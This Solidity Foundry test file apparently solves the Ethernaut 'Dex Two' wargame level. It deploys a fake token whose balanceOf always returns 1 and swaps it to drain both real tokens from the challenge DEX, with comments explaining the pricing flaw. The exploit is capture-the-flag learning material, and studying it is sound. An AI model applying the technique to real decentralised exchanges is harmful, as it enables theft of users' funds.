// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IDexTwo {
  function token1() external returns(address);
  function token2() external returns(address);
  function swap(address from, address to, uint amount) external;
}

contract MyToken {
  function transferFrom(address, address, uint256) public pure returns (bool) {
    // we don't even need to do anything here
    return false;
  }

  function balanceOf(address) public pure returns(uint256) {
    // the dex will ask for IERC20(from).balanceOf(address(this))
    // we give them the value `1`
    // the dex uses it to compute the swap amount = amount * token_to / token_from
    return 1;
  }
}

contract DexTwoTest is Test {
  address challengeAddress;
  IDexTwo dex;
  MyToken myToken;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xf59112032D54862E199626F55cFad4F8a3b0Fce9);
    dex = IDexTwo(challengeAddress);
    myToken = new MyToken();
  }

  function testExploit() public {
    // will get as token amount 1 * (100/ 1) = 100 on each swap
    dex.swap(address(myToken), dex.token1(), 1);
    dex.swap(address(myToken), dex.token2(), 1);
    utils.submitLevelInstance(challengeAddress);
  }
}
